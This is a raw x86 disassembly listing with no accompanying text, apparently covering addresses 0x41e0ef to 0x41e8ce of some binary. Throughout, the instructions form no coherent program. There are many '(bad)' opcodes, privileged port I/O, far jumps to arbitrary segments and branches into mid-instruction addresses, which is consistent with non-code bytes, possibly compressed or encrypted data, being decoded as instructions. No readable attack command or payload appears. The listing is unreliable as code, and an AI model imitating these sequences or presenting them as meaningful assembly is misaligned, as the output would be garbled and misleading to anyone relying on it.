  41e0ef:	(bad)  
  41e0f0:	adc    edx,DWORD PTR [edi]
  41e0f2:	xchg   ebp,eax
  41e0f3:	dec    ebx
  41e0f4:	jecxz  0x41e0d1
  41e0f6:	sar    DWORD PTR ds:0x7007f7af,1
  41e0fc:	mov    edi,0xf6607837
  41e101:	mov    BYTE PTR ds:0x8be08770,al
  41e107:	dec    ecx
  41e108:	push   esp
  41e109:	sbb    BYTE PTR [ebx],dh
  41e10b:	sub    BYTE PTR [edi+ecx*8-0x60],cl
  41e10f:	outs   dx,BYTE PTR ds:[esi]
  41e110:	inc    ecx
  41e111:	jb     0x41e171
  41e113:	xchg   dl,dl
  41e115:	hlt    
  41e116:	push   esp
  41e117:	(bad)  
  41e118:	out    0x6d,al
  41e11a:	xor    eax,0xbe501ffa
  41e11f:	sbb    BYTE PTR [eax-0x649dc5f6],0xb6
  41e126:	sub    BYTE PTR [esi+0x701bdc56],ah
  41e12c:	daa    
  41e12d:	cmp    al,0xe6
  41e12f:	sahf   
  41e130:	xchg   esi,eax
  41e131:	adc    dl,BYTE PTR [eax]
  41e133:	test   al,0xe6
  41e135:	mov    ch,0xf6
  41e137:	cmp    bh,bh
  41e139:	scas   al,BYTE PTR es:[edi]
  41e13a:	ja     0x41e195
  41e13c:	test   edx,0xb455ea2b
  41e142:	push   ss
  41e143:	jno    0x41e0e5
  41e145:	inc    edi
  41e146:	push   edx
  41e147:	bound  edi,QWORD PTR [edi+ecx*1]
  41e14a:	rcl    BYTE PTR [esi],0xa6
  41e14d:	cli    
  41e14e:	and    eax,0x525babec
  41e153:	cli    
  41e154:	add    edi,esp
  41e156:	add    eax,0x9819ac6b
  41e15b:	mov    WORD PTR [edx+ebx*2+0x4],?
  41e15f:	ror    esi,0xee
  41e162:	pop    ebp
  41e163:	dec    esi
  41e164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e165:	pop    esi
  41e166:	mov    esp,esp
  41e168:	lods   eax,DWORD PTR ds:[esi]
  41e169:	in     al,dx
  41e16a:	sub    dl,ah
  41e16c:	imul   eax,DWORD PTR [ebx-0x2927d16a],0x28a3f95b
  41e176:	pop    es
  41e177:	lock jge 0x41e1b8
  41e17a:	lea    ecx,[esi]
  41e17c:	sbb    eax,0x3047aa1a
  41e181:	or     BYTE PTR [eax+0x65bccfac],0xb7
  41e188:	mov    edi,0x9c503974
  41e18d:	cld    
  41e18e:	inc    edi
  41e18f:	(bad)  
  41e190:	jns    0x41e17d
  41e192:	push   edi
  41e193:	jns    0x41e11c
  41e195:	(bad)  
  41e196:	aam    0x80
  41e198:	das    
  41e199:	in     al,dx
  41e19a:	mov    eax,0xb8726067
  41e19f:	dec    esp
  41e1a0:	jnp    0x41e15a
  41e1a2:	pop    ecx
  41e1a3:	in     al,dx
  41e1a4:	xchg   esi,eax
  41e1a5:	shr    BYTE PTR [eax-0x554c997b],0x7f
  41e1ac:	call   0xd258:0xf0f531f3
  41e1b3:	shl    edi,1
  41e1b5:	dec    esi
  41e1b6:	nop
  41e1b7:	xchg   DWORD PTR [ebx-0x7e],esi
  41e1ba:	xor    bh,BYTE PTR [esi+0x2d8c6f56]
  41e1c0:	nop
  41e1c1:	add    cl,BYTE PTR [edx+0x3c99ad49]
  41e1c7:	bound  ebx,QWORD PTR [esi]
  41e1c9:	lods   al,BYTE PTR ds:[esi]
  41e1ca:	push   esi
  41e1cb:	push   cs
  41e1cc:	push   ebx
  41e1cd:	add    DWORD PTR [edx-0x4],0xffffffcb
  41e1d1:	in     eax,0x77
  41e1d3:	mov    ds:0xe744255e,eax
  41e1d8:	xchg   edx,eax
  41e1d9:	adc    eax,0x4536bde
  41e1de:	adc    BYTE PTR ds:0x1a02ec8b,0x61
  41e1e5:	cs loope 0x41e235
  41e1e8:	jne    0x41e258
  41e1ea:	retf   
  41e1eb:	adc    eax,DWORD PTR [ebx-0x7957579f]
  41e1f1:	repnz (bad) 
  41e1f3:	stc    
  41e1f4:	or     eax,0x424c3e9c
  41e1f9:	or     eax,DWORD PTR ds:0xb7e3eee2
  41e1ff:	mov    cl,ch
  41e201:	jp     0x41e1d6
  41e203:	je     0x41e282
  41e205:	adc    ebp,DWORD PTR [eax]
  41e207:	pop    ss
  41e208:	dec    edi
  41e209:	out    dx,eax
  41e20a:	test   eax,0xb61d321e
  41e20f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e210:	aas    
  41e211:	int3   
  41e212:	push   esi
  41e213:	clc    
  41e214:	jne    0x41e250
  41e216:	push   0x46309264
  41e21b:	(bad)  
  41e21c:	mov    ebp,0xff667471
  41e221:	sbb    BYTE PTR [edi+eiz*4-0x49473009],al
  41e228:	jmp    0x41e1ab
  41e22a:	xchg   BYTE PTR [eax],cl
  41e22c:	pushf  
  41e22d:	hlt    
  41e22e:	inc    edx
  41e22f:	aas    
  41e230:	pop    ds
  41e231:	cmc    
  41e232:	mov    ecx,0x9358d9fa
  41e237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e238:	jnp    0x41e1d8
  41e23a:	shr    BYTE PTR [esi],0xa0
  41e23d:	push   ebp
  41e23e:	rcl    DWORD PTR [ecx*8+0x4ebcc345],0xda
  41e246:	jmp    0x41e29f
  41e248:	test   dh,bl
  41e24a:	in     al,0xc5
  41e24c:	mov    dl,0x42
  41e24e:	sbb    BYTE PTR [eax+edx*2+0x502af874],al
  41e255:	add    eax,0x1f2b2
  41e25a:	gs test eax,0xd1129ff7
  41e260:	in     al,0xa1
  41e262:	inc    eax
  41e263:	(bad)  
  41e264:	xchg   esi,eax
  41e265:	retf   
  41e266:	push   ss
  41e267:	lock aam 0xef
  41e26a:	add    bh,BYTE PTR ds:0x94b75a62
  41e270:	mov    eax,ds:0xb5db837d
  41e275:	inc    ebx
  41e276:	shl    edi,cl
  41e278:	inc    esp
  41e279:	adc    al,0x4b
  41e27b:	adc    cl,BYTE PTR ds:0x310dc165
  41e281:	mov    WORD PTR [ebx+eiz*2],gs
  41e284:	out    0xe5,al
  41e286:	push   ebp
  41e287:	mov    bh,0xc8
  41e289:	adc    DWORD PTR [esi-0x7dd4b76b],ebp
  41e28f:	mov    esp,0x50a0573d
  41e294:	mov    dh,0x8a
  41e296:	push   esp
  41e297:	je     0x41e292
  41e299:	sub    BYTE PTR [edx+0x58d0db49],ah
  41e29f:	jg     0x41e2f8
  41e2a1:	retf   0x5b16
  41e2a4:	repnz mov bl,0x4c
  41e2a7:	mov    bl,0xa3
  41e2a9:	out    dx,eax
  41e2aa:	fstp   TBYTE PTR [esp+esi*2-0x10]
  41e2ae:	xor    al,0x5d
  41e2b0:	arpl   WORD PTR [ebp+edi*1-0x11],si
  41e2b4:	lods   al,BYTE PTR ds:[esi]
  41e2b5:	pop    edi
  41e2b6:	or     BYTE PTR [edi-0x38],0x12
  41e2ba:	fiadd  WORD PTR [esi]
  41e2bc:	mov    bl,0xf9
  41e2be:	(bad)  
  41e2bf:	jae    0x41e2e7
  41e2c1:	xchg   ecx,eax
  41e2c2:	cmp    al,0xa5
  41e2c4:	jae    0x41e2de
  41e2c6:	or     DWORD PTR [ecx+0x138da0ef],ebp
  41e2cc:	adc    esi,ebx
  41e2ce:	je     0x41e2d6
  41e2d0:	add    al,0xf3
  41e2d2:	scas   eax,DWORD PTR es:[edi]
  41e2d3:	and    esp,DWORD PTR [edi-0x69]
  41e2d6:	inc    ebp
  41e2d7:	in     al,dx
  41e2d8:	icebp  
  41e2d9:	not    esi
  41e2db:	test   ebx,0xb8e4d6ac
  41e2e1:	xchg   edx,eax
  41e2e2:	popa   
  41e2e3:	xor    eax,0x8ccf648f
  41e2e8:	push   eax
  41e2e9:	out    0xba,al
  41e2eb:	scas   eax,DWORD PTR es:[edi]
  41e2ec:	xor    BYTE PTR [edx],ch
  41e2ee:	les    ebx,FWORD PTR [ecx+0x2c]
  41e2f1:	push   ebp
  41e2f2:	out    dx,eax
  41e2f3:	sbb    edi,0xe5d58e30
  41e2f9:	sub    DWORD PTR [edx-0x2a],esp
  41e2fc:	and    ebx,eax
  41e2fe:	in     eax,dx
  41e2ff:	and    cl,BYTE PTR [ecx+ebx*1]
  41e302:	popa   
  41e303:	push   edx
  41e304:	adc    esi,DWORD PTR [esi+0x52]
  41e307:	and    DWORD PTR ds:0x6fdf8fe3,ebp
  41e30d:	in     al,0x40
  41e30f:	scas   eax,DWORD PTR es:[edi]
  41e310:	outs   dx,DWORD PTR ds:[esi]
  41e311:	push   ebp
  41e312:	and    eax,0x662bb56e
  41e317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e318:	pop    ebp
  41e319:	lea    ebx,[edi-0x76f7f39f]
  41e31f:	lock xor BYTE PTR [ebp-0x334ba256],al
  41e326:	and    al,0x24
  41e328:	or     al,0xf1
  41e32a:	add    bh,BYTE PTR [edi]
  41e32c:	inc    ebx
  41e32d:	add    ebp,DWORD PTR [ebp+ecx*1+0x16813670]
  41e334:	lods   al,BYTE PTR ds:[esi]
  41e335:	mov    ss,ebp
  41e337:	lds    ebx,FWORD PTR [ecx]
  41e339:	nop
  41e33a:	in     eax,dx
  41e33b:	iret   
  41e33c:	add    esi,DWORD PTR ds:0xc536f3aa
  41e342:	inc    eax
  41e343:	sub    eax,0xf45fd2d4
  41e348:	inc    edi
  41e349:	inc    ecx
  41e34a:	lds    edi,FWORD PTR [esi+0xd]
  41e34d:	jne    0x41e2f1
  41e34f:	in     al,dx
  41e350:	cmp    bl,ah
  41e352:	(bad)  [eax]
  41e354:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41e356:	mov    ebx,0xe0700ed9
  41e35b:	test   al,0xbb
  41e35d:	push   esi
  41e35e:	sahf   
  41e35f:	nop
  41e360:	ror    DWORD PTR [ecx+0x1d],1
  41e363:	into   
  41e364:	dec    ecx
  41e365:	enter  0xdb7f,0xed
  41e369:	sahf   
  41e36a:	pop    edx
  41e36b:	and    BYTE PTR [edx-0x50],cl
  41e36e:	jecxz  0x41e2f6
  41e370:	leave  
  41e371:	cld    
  41e372:	retf   0x41aa
  41e375:	inc    esp
  41e376:	neg    ch
  41e378:	leave  
  41e379:	cmp    esi,ebp
  41e37b:	push   cs
  41e37c:	gs jae 0x41e3d4
  41e37f:	xor    bl,BYTE PTR [eax]
  41e381:	adc    al,0x71
  41e383:	out    0x31,al
  41e385:	fldenv [esp+edi*2]
  41e388:	clc    
  41e389:	fmulp  st(2),st
  41e38b:	in     al,dx
  41e38c:	fwait
  41e38d:	push   0x63811d7b
  41e392:	into   
  41e393:	add    DWORD PTR [ebx],ecx
  41e395:	cld    
  41e396:	jmp    0xea3e:0x7f03a265
  41e39d:	pop    edx
  41e39e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e39f:	push   esp
  41e3a0:	jl     0x41e360
  41e3a2:	pushf  
  41e3a3:	inc    edx
  41e3a4:	jbe    0x41e3bc
  41e3a6:	cmp    edi,DWORD PTR [ebp+0x20]
  41e3a9:	test   eax,0xf44098f6
  41e3ae:	das    
  41e3af:	addr16 cdq 
  41e3b1:	retf   
  41e3b2:	inc    ebp
  41e3b3:	inc    esi
  41e3b4:	dec    edi
  41e3b5:	jne    0x41e3f0
  41e3b7:	inc    esi
  41e3b8:	mov    ebp,0x924dc0aa
  41e3bd:	add    DWORD PTR [esi],edx
  41e3bf:	push   0x9663a620
  41e3c4:	fwait
  41e3c5:	mov    ah,BYTE PTR [ebp-0x3382a4d6]
  41e3cb:	adc    eax,0xe1061887
  41e3d0:	cmp    BYTE PTR [ecx],dl
  41e3d2:	mov    al,ds:0xa04d28b
  41e3d8:	fsub   DWORD PTR [esi]
  41e3da:	out    dx,al
  41e3db:	xor    esi,DWORD PTR [esi+0x589b15ac]
  41e3e1:	stos   BYTE PTR es:[edi],al
  41e3e2:	pop    ebp
  41e3e3:	jo     0x41e3c8
  41e3e5:	pop    esi
  41e3e6:	jae    0x41e376
  41e3e8:	jns    0x41e448
  41e3ea:	push   ss
  41e3eb:	test   al,0xa0
  41e3ed:	jge    0x41e382
  41e3ef:	mov    dh,0xce
  41e3f1:	mov    cs,ebp
  41e3f3:	iret   
  41e3f4:	aas    
  41e3f5:	pop    ecx
  41e3f6:	push   ss
  41e3f7:	xor    DWORD PTR [edi-0x5d],ecx
  41e3fa:	fistp  QWORD PTR [edx-0x30e5d587]
  41e400:	fwait
  41e401:	lds    ebp,FWORD PTR [ebp-0x6a38b46a]
  41e407:	sar    DWORD PTR [ebx-0x3f],1
  41e40a:	sub    DWORD PTR [edx+0x23f048fc],edi
  41e410:	mov    WORD PTR [ebx],cs
  41e412:	jge    0x63d3e970
  41e418:	or     BYTE PTR [eax],bl
  41e41a:	ss inc edx
  41e41d:	pop    edi
  41e41e:	lea    ecx,[eax+0x2c2939f4]
  41e424:	out    dx,al
  41e425:	adc    DWORD PTR [ebp+0x28],esp
  41e428:	cmp    dl,BYTE PTR ds:0x26409643
  41e42e:	(bad)  
  41e42f:	pop    edx
  41e430:	fcom   DWORD PTR [edx+0x22]
  41e433:	and    dl,ch
  41e435:	loope  0x41e460
  41e437:	jae    0x41e453
  41e439:	ds xchg esp,eax
  41e43b:	shr    BYTE PTR [edx+0x6e606e14],0x87
  41e442:	cmp    bh,BYTE PTR [edx+0x19]
  41e445:	jmp    0x41e4c0
  41e447:	xchg   esp,eax
  41e448:	jl     0x41e3cb
  41e44a:	add    al,0xdc
  41e44c:	mov    ecx,0xa815a802
  41e451:	aas    
  41e452:	xchg   DWORD PTR [ebx-0x2f],esi
  41e455:	pop    ebp
  41e456:	popa   
  41e457:	pusha  
  41e458:	scas   al,BYTE PTR es:[edi]
  41e459:	mov    bh,0x8
  41e45b:	jecxz  0x41e402
  41e45d:	push   esp
  41e45e:	fstp   TBYTE PTR [esi-0x6077feca]
  41e464:	arpl   di,dx
  41e466:	loop   0x41e47e
  41e468:	test   BYTE PTR [ecx+0x3d],al
  41e46b:	mov    DWORD PTR [edi-0x4a3b579c],edx
  41e471:	je     0x41e40c
  41e473:	cmp    DWORD PTR [ecx],eax
  41e475:	xchg   esi,eax
  41e476:	lock ins BYTE PTR es:[edi],dx
  41e478:	mov    eax,cs
  41e47a:	cmp    eax,0x2c3242a7
  41e47f:	data16 std 
  41e481:	adc    DWORD PTR [esi+0x3169a1b4],eax
  41e487:	retf   0x8335
  41e48a:	popf   
  41e48b:	xor    ebp,DWORD PTR [ecx+0x5daba81f]
  41e491:	sahf   
  41e492:	and    bl,BYTE PTR [edx+0x1]
  41e495:	leave  
  41e496:	mov    BYTE PTR [eax],al
	...
  41e514:	inc    ecx
  41e515:	inc    BYTE PTR [ebx+eiz*1-0x1188441]
  41e51c:	push   ecx
  41e51d:	jecxz  0x41e544
  41e51f:	arpl   WORD PTR [ebp+0x22],dx
  41e522:	mov    ch,0x75
  41e524:	or     eax,DWORD PTR [eax+0x76b0001]
  41e52a:	add    BYTE PTR [eax],al
  41e52c:	pushf  
  41e52d:	xor    al,0x2f
  41e52f:	xor    al,0xb9
  41e531:	cs dec ecx
  41e533:	in     eax,0x9b
  41e535:	loop   0x41e4db
  41e537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e538:	in     al,0xf3
  41e53a:	dec    ecx
  41e53c:	repnz mov dh,0xf0
  41e53f:	inc    ebx
  41e540:	fistp  QWORD PTR [edx+ebx*4+0x1238ab19]
  41e547:	test   DWORD PTR [ebp+0x18353f5f],eax
  41e54d:	xchg   BYTE PTR [ebp+0x25],cl
  41e550:	sti    
  41e551:	or     dl,BYTE PTR [edi]
  41e553:	stos   DWORD PTR es:[edi],eax
  41e554:	sub    esp,DWORD PTR [esi-0x4ed1133d]
  41e55a:	push   ebx
  41e55b:	sub    al,0xed
  41e55d:	ja     0x41e53e
  41e55f:	dec    eax
  41e560:	jg     0x41e54a
  41e562:	sub    eax,0x9bd2515d
  41e567:	add    al,0xda
  41e569:	(bad)  
  41e56a:	jl     0x41e5c7
  41e56c:	cwde   
  41e56d:	dec    ebp
  41e56e:	jmp    0xad112678
  41e573:	test   eax,0x188edef5
  41e578:	mov    cl,0xc9
  41e57a:	add    al,0x4b
  41e57c:	test   al,0xe0
  41e57e:	fist   DWORD PTR [eax]
  41e580:	dec    ecx
  41e581:	mov    edi,0x7b2ab766
  41e586:	les    eax,FWORD PTR [esi+0x53]
  41e589:	shl    DWORD PTR [esi+0x6153844f],1
  41e58f:	fucomi st,st(5)
  41e591:	fwait
  41e592:	jge    0x41e51a
  41e594:	loope  0x41e5c7
  41e596:	sub    al,0x7
  41e598:	jae    0x41e53e
  41e59a:	push   0x5f
  41e59c:	je     0x41e58c
  41e59e:	pop    esp
  41e59f:	xchg   esi,eax
  41e5a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5a1:	loopne 0x41e56c
  41e5a3:	push   eax
  41e5a4:	jl     0x41e5de
  41e5a6:	lods   eax,DWORD PTR ds:[esi]
  41e5a7:	out    0x86,eax
  41e5a9:	mov    al,ds:0xdfcff130
  41e5ae:	pop    ebx
  41e5af:	arpl   WORD PTR ds:0xf2c8f77c,bx
  41e5b5:	mov    ebx,0x8dbc3bbd
  41e5ba:	adc    esi,ecx
  41e5bc:	stos   DWORD PTR es:[edi],eax
  41e5bd:	sbb    esp,DWORD PTR [eax]
  41e5bf:	xor    esi,DWORD PTR [edx]
  41e5c1:	cmp    ecx,DWORD PTR [eax+0x65470bb7]
  41e5c7:	popa   
  41e5c8:	adc    ebp,DWORD PTR [eax+0x376c58b]
  41e5ce:	test   DWORD PTR [edx-0x7dcb4721],0xd34719c6
  41e5d8:	aam    0xff
  41e5da:	fld    QWORD PTR [esi-0x80]
  41e5dd:	sbb    eax,0xc600f3e1
  41e5e2:	sbb    DWORD PTR [ecx],esi
  41e5e4:	push   esi
  41e5e5:	ins    DWORD PTR es:[edi],dx
  41e5e6:	jp     0x41e5b1
  41e5e8:	mov    ah,0xbe
  41e5ea:	fdiv   DWORD PTR [ebx-0x292ad634]
  41e5f0:	xor    eax,0xb58d2c98
  41e5f5:	xchg   ecx,eax
  41e5f6:	mov    DWORD PTR [edi+eiz*2],eax
  41e5f9:	xor    al,0x96
  41e5fb:	daa    
  41e5fc:	xchg   ebx,eax
  41e5fd:	in     eax,0x79
  41e5ff:	xor    bl,BYTE PTR [ecx-0xc]
  41e602:	stos   DWORD PTR es:[edi],eax
  41e603:	test   eax,0x45633c79
  41e608:	rcr    ecx,cl
  41e60a:	pop    ecx
  41e60b:	rcl    esi,cl
  41e60d:	dec    DWORD PTR [ebx+0x14]
  41e610:	outs   dx,DWORD PTR ds:[esi]
  41e611:	stos   DWORD PTR es:[edi],eax
  41e612:	xchg   ecx,eax
  41e613:	jp     0x41e61a
  41e615:	mov    WORD PTR [edx+0x7c],cs
  41e618:	mov    cl,0x6
  41e61a:	rol    BYTE PTR [ebx-0x7e1a772d],1
  41e620:	pop    esi
  41e621:	stos   DWORD PTR es:[edi],eax
  41e622:	gs xchg esi,eax
  41e624:	popf   
  41e625:	jnp    0x41e5ce
  41e627:	inc    esp
  41e628:	pop    ebx
  41e629:	fwait
  41e62a:	(bad)  
  41e62b:	es jmp 0xe809:0xfe90859b
  41e633:	fprem1 
  41e635:	add    al,0xab
  41e637:	lods   eax,DWORD PTR ds:[esi]
  41e638:	fucomp st(3)
  41e63a:	stos   BYTE PTR es:[edi],al
  41e63b:	shl    bh,1
  41e63d:	retf   
  41e63e:	stos   DWORD PTR es:[edi],eax
  41e63f:	ins    BYTE PTR es:[edi],dx
  41e640:	xor    eax,0x23ba97a0
  41e645:	or     BYTE PTR [esp+ebp*8],dh
  41e648:	fld    DWORD PTR [edi-0x294026f0]
  41e64e:	mov    ebx,0x45496bfb
  41e653:	lock imul edx,esp,0x5480ab7
  41e65a:	add    dh,BYTE PTR [esi+0x14b7c9aa]
  41e660:	in     al,dx
  41e661:	leave  
  41e662:	and    BYTE PTR [ecx-0x715b6026],cl
  41e668:	push   ebx
  41e669:	lods   al,BYTE PTR ds:[esi]
  41e66a:	jo     0x41e617
  41e66c:	nop
  41e66d:	dec    esp
  41e66e:	mov    ds:0x62d603f9,al
  41e673:	adc    ah,BYTE PTR [edx-0x29d826f0]
  41e679:	mov    ds:0xaf9ea418,eax
  41e67e:	rcl    DWORD PTR [ebx-0x5a],0xf9
  41e682:	push   edi
  41e683:	(bad)  
  41e684:	push   esi
  41e685:	add    edi,DWORD PTR [ebp-0x6e6f253b]
  41e68b:	pop    esi
  41e68c:	stos   DWORD PTR es:[edi],eax
  41e68d:	adc    edi,esi
  41e68f:	and    eax,0xe9229901
  41e694:	shl    esi,1
  41e696:	pop    ebp
  41e697:	and    ah,bl
  41e699:	dec    edi
  41e69a:	add    al,0xc1
  41e69c:	dec    ebp
  41e69d:	repnz cwde 
  41e69f:	div    DWORD PTR [edx]
  41e6a1:	test   BYTE PTR [edi],cl
  41e6a3:	sub    cl,BYTE PTR [edx-0x2a79998a]
  41e6a9:	xchg   esi,eax
  41e6aa:	jae    0x41e65c
  41e6ac:	push   edi
  41e6ad:	(bad)  [eax]
  41e6af:	repz cmp DWORD PTR es:[ebp+0x46b0b9c0],ecx
  41e6b7:	out    0x39,al
  41e6b9:	push   eax
  41e6ba:	fwait
  41e6bb:	jo     0x41e713
  41e6bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6be:	xor    BYTE PTR [ebx-0xd],cl
  41e6c1:	(bad)  [ecx-0x79]
  41e6c4:	popf   
  41e6c5:	add    esi,DWORD PTR [eax-0x49fddbe9]
  41e6cb:	nop
  41e6cc:	nop
  41e6cd:	pushf  
  41e6ce:	sub    al,0x71
  41e6d0:	ds jo  0x41e74d
  41e6d3:	push   ebx
  41e6d4:	sbb    al,0x6a
  41e6d6:	and    ah,dh
  41e6d8:	js     0x41e6f8
  41e6da:	xchg   esi,eax
  41e6db:	push   ebp
  41e6dc:	shl    ah,cl
  41e6de:	nop
  41e6df:	xchg   BYTE PTR [esp+esi*8-0x5bfd94e9],bl
  41e6e6:	adc    bl,dh
  41e6e8:	mov    al,0x73
  41e6ea:	xchg   ecx,eax
  41e6eb:	mov    ecx,0xd24e4c7a
  41e6f0:	mov    ds:0x91c46eaa,al
  41e6f5:	mov    bl,BYTE PTR [ecx+0x4db7e482]
  41e6fb:	dec    ecx
  41e6fc:	dec    edi
  41e6fd:	icebp  
  41e6fe:	jnp    0x41e6ae
  41e700:	xchg   DWORD PTR [ebx],edi
  41e702:	mov    dl,BYTE PTR [ecx+0x20]
  41e705:	sti    
  41e706:	add    al,0x6f
  41e708:	mov    DWORD PTR [edx+0x64f52c5],edi
  41e70e:	jmp    0x42bd5b08
  41e713:	lahf   
  41e714:	cmp    BYTE PTR [ebp+0x65],dl
  41e717:	mov    cl,0x17
  41e719:	push   ss
  41e71a:	sub    BYTE PTR [ebp+ebp*2+0x5c],bl
  41e71e:	push   ds
  41e71f:	iret   
  41e720:	jecxz  0x41e773
  41e722:	bound  edi,QWORD PTR [ebx]
  41e724:	lahf   
  41e725:	call   0x3e6f:0xada52681
  41e72c:	add    esi,DWORD PTR [esi]
  41e72e:	sub    ebp,DWORD PTR [ecx+0x111c226e]
  41e734:	movups xmm5,XMMWORD PTR [ebx-0x66]
  41e738:	fidivr DWORD PTR [edx+0xe]
  41e73b:	xchg   DWORD PTR [ebx-0x4263a0ac],eax
  41e741:	arpl   WORD PTR [esi+0x55b0e3c6],cx
  41e747:	fisub  WORD PTR [edi+0x20]
  41e74a:	sar    bh,0x6e
  41e74d:	pop    ebp
  41e74e:	jl     0x41e782
  41e750:	int    0x14
  41e752:	add    eax,0xf58691da
  41e757:	jp     0x41e758
  41e759:	push   edx
  41e75a:	test   BYTE PTR [ebx],al
  41e75c:	jp     0x41e72b
  41e75e:	pop    ebp
  41e75f:	adc    al,BYTE PTR [ecx-0x14]
  41e762:	jmp    0x41e7d2
  41e764:	test   DWORD PTR [esi-0x52c92244],edi
  41e76a:	cli    
  41e76b:	retf   
  41e76c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e76d:	mov    ch,0xa9
  41e76f:	xlat   BYTE PTR ds:[ebx]
  41e770:	push   esi
  41e771:	ret    0xe275
  41e774:	adc    ebx,DWORD PTR [ebx]
  41e776:	retf   0x3b12
  41e779:	push   esi
  41e77a:	loopne 0x41e731
  41e77c:	pop    edx
  41e77d:	repz inc edi
  41e77f:	test   BYTE PTR [edx],cl
  41e781:	daa    
  41e782:	loop   0x41e78c
  41e784:	mov    ebp,0xa1861b27
  41e789:	add    dl,BYTE PTR [edx-0x1edafd34]
  41e78f:	and    ebp,edi
  41e791:	pop    ss
  41e792:	fs jp  0x41e813
  41e795:	icebp  
  41e796:	sbb    eax,0x4912553
  41e79b:	inc    edx
  41e79c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e79d:	mov    esi,DWORD PTR [ebp-0x146938c6]
  41e7a3:	pop    ebx
  41e7a4:	lock sbb bh,BYTE PTR [ecx-0x9]
  41e7a8:	ds pop edi
  41e7aa:	xchg   esi,eax
  41e7ab:	out    dx,eax
  41e7ac:	repz pop ebp
  41e7ae:	das    
  41e7af:	inc    ebp
  41e7b0:	adc    BYTE PTR [edx+edi*1-0x69],bl
  41e7b4:	push   eax
  41e7b5:	pop    eax
  41e7b6:	pop    edx
  41e7b7:	mov    gs,WORD PTR [edi+0x75a78f52]
  41e7bd:	dec    edi
  41e7be:	sbb    eax,0x8a7d2bbd
  41e7c3:	mov    bl,0x73
  41e7c5:	daa    
  41e7c6:	aaa    
  41e7c7:	sub    ebx,DWORD PTR [esp+ecx*8+0x422c72f9]
  41e7ce:	bound  ebp,QWORD PTR [ecx+edx*8-0x55d052f8]
  41e7d5:	sbb    eax,DWORD PTR [eax+0x20feb521]
  41e7db:	pusha  
  41e7dc:	push   edi
  41e7dd:	xor    DWORD PTR [ebp+0x4d5bd019],ebp
  41e7e3:	ins    DWORD PTR es:[edi],dx
  41e7e4:	sbb    ecx,DWORD PTR [esi-0x54]
  41e7e7:	inc    esi
  41e7e8:	mov    ecx,0x93c85251
  41e7ed:	xor    BYTE PTR [edx-0xb],bl
  41e7f0:	or     al,0xdf
  41e7f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7f3:	jo     0x41e839
  41e7f5:	adc    edi,DWORD PTR ds:0xa2511ac0
  41e7fb:	(bad)  
  41e7fc:	xchg   ebp,eax
  41e7fd:	pop    ebp
  41e7fe:	fsubr  QWORD PTR [ecx+edx*4-0x6c7dd97f]
  41e805:	ficomp WORD PTR [ebx+0x2]
  41e808:	jnp    0x41e884
  41e80a:	lock add ebp,esp
  41e80d:	sbb    eax,0x12508672
  41e812:	ins    DWORD PTR es:[edi],dx
  41e813:	add    al,0xe5
  41e815:	adc    BYTE PTR [ebp+0x1c],dh
  41e818:	aas    
  41e819:	inc    esi
  41e81a:	icebp  
  41e81b:	add    BYTE PTR [esi+0x37cbfa3d],ch
  41e821:	push   esi
  41e822:	dec    esp
  41e823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e824:	mov    bh,0x91
  41e826:	(bad)  
  41e828:	ja     0x41e7e4
  41e82a:	lock out 0x9f,eax
  41e82d:	test   al,0x43
  41e82f:	dec    ebp
  41e830:	mov    dl,0xdd
  41e832:	cwde   
  41e833:	mov    esp,0xa620d8bf
  41e838:	gs xchg ebx,eax
  41e83a:	sub    esi,DWORD PTR [edx+ebx*1+0x604e650b]
  41e841:	sbb    ch,BYTE PTR [ecx-0x17c11e7b]
  41e847:	pop    edi
  41e848:	push   eax
  41e849:	fistp  WORD PTR ds:[ebx-0x364ae375]
  41e850:	cmp    dl,BYTE PTR [ebp-0x47c92503]
  41e856:	int3   
  41e857:	test   al,0xbc
  41e859:	fs aas 
  41e85b:	out    0x43,al
  41e85d:	fmul   DWORD PTR [edi]
  41e85f:	inc    BYTE PTR [edx+0x69da3836]
  41e865:	shl    DWORD PTR [esi+edi*1-0x4d],0x9d
  41e86a:	push   cs
  41e86b:	outs   dx,BYTE PTR ds:[esi]
  41e86c:	adc    BYTE PTR [esi+0x48],0x69
  41e870:	xor    al,0xe7
  41e872:	test   DWORD PTR [edi-0x9],esi
  41e875:	jo     0x41e8c0
  41e877:	jno    0x41e8e4
  41e879:	push   ss
  41e87a:	shr    edx,0x91
  41e87d:	ret    
  41e87e:	add    edi,DWORD PTR [edx]
  41e880:	(bad)  
  41e881:	xor    cl,BYTE PTR [ecx]
  41e883:	(bad)  
  41e884:	fld    DWORD PTR [edx+0x17d747d3]
  41e88a:	sbb    BYTE PTR [ebx+0x6e],al
  41e88d:	xchg   ecx,eax
  41e88e:	inc    ecx
  41e88f:	pop    esi
  41e890:	imul   esi,DWORD PTR [esi],0xd93ff240
  41e896:	out    0xf8,al
  41e898:	or     eax,0xb9001b5d
  41e89d:	push   ecx
  41e89e:	and    DWORD PTR [edi-0x76],edx
  41e8a1:	push   cs
  41e8a2:	fisubr DWORD PTR [edx+edi*8+0x6e]
  41e8a6:	pop    edi
  41e8a7:	into   
  41e8a8:	push   cs
  41e8a9:	xchg   esi,eax
  41e8aa:	popf   
  41e8ab:	int    0xeb
  41e8ad:	xchg   ebp,eax
  41e8ae:	add    eax,0x16bbef43
  41e8b3:	mov    edx,0x58004069
  41e8b8:	jmp    0x41472dcb
  41e8bd:	pop    ecx
  41e8be:	clc    
  41e8bf:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8c1:	fwait
  41e8c2:	(bad)  
  41e8c3:	fnsave [eax+0x10f62044]
  41e8c9:	addr16 push ds
  41e8cb:	fcmove st,st(4)
  41e8cd:	ret    
  41e8ce:	daa    
